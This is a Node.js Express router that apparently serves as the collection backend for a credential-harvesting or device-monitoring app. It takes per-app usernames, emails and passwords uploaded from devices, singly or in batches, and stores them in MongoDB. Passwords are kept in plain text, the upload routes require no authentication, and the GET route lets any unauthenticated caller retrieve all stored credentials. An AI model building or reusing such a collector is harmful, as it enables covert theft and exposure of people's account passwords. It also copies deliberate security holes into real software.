const express = require('express');
const router = express.Router();
const { getDb } = require('../database/mongodb');
const crypto = require('crypto');
const websocketService = require('../services/websocketService');
const { authenticate, optionalAuth } = require('../middleware/auth');

// POST /api/credentials - Upload single credential
router.post('/', async (req, res) => {
    try {
        const { deviceId, accountType, appPackage, appName, email, username, password, domain, url, devicePassword, timestamp } = req.body;
        
        if (!password) {
            return res.status(400).json({
                success: false,
                message: 'Password is required'
            });
        }
        
        const db = getDb();
        const credentialId = crypto.randomUUID();
        
        const credentialDoc = {
            id: credentialId,
            deviceId: deviceId || null,
            accountType: accountType || 'APP_PASSWORD',
            appPackage: appPackage || null,
            appName: appName || null,
            email: email || null,
            username: username || null,
            password: password, // Plain text password (not masked)
            domain: domain || null,
            url: url || null,
            devicePassword: devicePassword ? true : false,
            timestamp: timestamp || Date.now(),
            synced: true, // Mark as synced
            syncAttempts: 0,
            lastSyncAttempt: null,
            errorMessage: null,
            createdAt: Math.floor(Date.now() / 1000)
        };
        
        await db.collection('credentials').insertOne(credentialDoc);
        
        // Broadcast WebSocket update (without password for security)
        if (deviceId) {
            const safeCredential = { ...req.body, password: '***' }; // Don't broadcast password
            websocketService.broadcastDataUpdate(deviceId, 'credential', safeCredential);
        }
        
        res.json({
            success: true,
            message: 'Credential saved successfully',
            id: credentialId
        });
    } catch (error) {
        console.error('Error saving credential:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving credential'
        });
    }
});

// POST /api/credentials/batch - Upload multiple credentials
router.post('/batch', async (req, res) => {
    try {
        const credentials = req.body;
        
        if (!Array.isArray(credentials) || credentials.length === 0) {
            return res.status(400).json({
                success: false,
                message: 'Invalid credentials array'
            });
        }
        
        const db = getDb();
        const credentialDocs = credentials.map(cred => {
            const credentialId = crypto.randomUUID();
            return {
                id: credentialId,
                deviceId: cred.deviceId || null,
                accountType: cred.accountType || 'APP_PASSWORD',
                appPackage: cred.appPackage || null,
                appName: cred.appName || null,
                email: cred.email || null,
                username: cred.username || null,
                password: cred.password, // Plain text password (not masked)
                domain: cred.domain || null,
                url: cred.url || null,
                devicePassword: cred.devicePassword ? true : false,
                timestamp: cred.timestamp || Date.now(),
                synced: true,
                syncAttempts: 0,
                lastSyncAttempt: null,
                errorMessage: null,
                createdAt: Math.floor(Date.now() / 1000)
            };
        });
        
        if (credentialDocs.length > 0) {
            await db.collection('credentials').insertMany(credentialDocs);
        }
        
        // Broadcast WebSocket updates (without password for security)
        credentials.forEach(cred => {
            if (cred.deviceId) {
                const safeCredential = { ...cred, password: '***' };
                websocketService.broadcastDataUpdate(cred.deviceId, 'credential', safeCredential);
            }
        });
        
        res.json({
            success: true,
            message: `Saved ${credentials.length} credentials successfully`,
            count: credentials.length
        });
    } catch (error) {
        console.error('Error saving credentials batch:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving credentials batch'
        });
    }
});

// GET /api/credentials - Get credentials (with optional filters and authorization)
router.get('/', optionalAuth, async (req, res) => {
    try {
        const user = req.user || {};
        const role = user.role;
        const assignedDeviceId = user.deviceId;
        const { accountType, appPackage, email, deviceId, limit = 100 } = req.query;
        
        const db = getDb();
        const filter = {};
        
        // Device owners can only see credentials from their assigned device
        if (role === 'device_owner' && assignedDeviceId) {
            filter.deviceId = assignedDeviceId;
        } else if (deviceId) {
            // Admin can filter by deviceId
            filter.deviceId = deviceId;
        }
        
        if (accountType) {
            filter.accountType = accountType;
        }
        
        if (appPackage) {
            filter.appPackage = appPackage;
        }
        
        if (email) {
            filter.email = email;
        }
        
        const credentials = await db.collection('credentials')
            .find(filter)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit))
            .toArray();
        
        res.json({
            success: true,
            credentials: credentials,
            count: credentials.length
        });
    } catch (error) {
        console.error('Error fetching credentials:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching credentials'
        });
    }
});

module.exports = router;
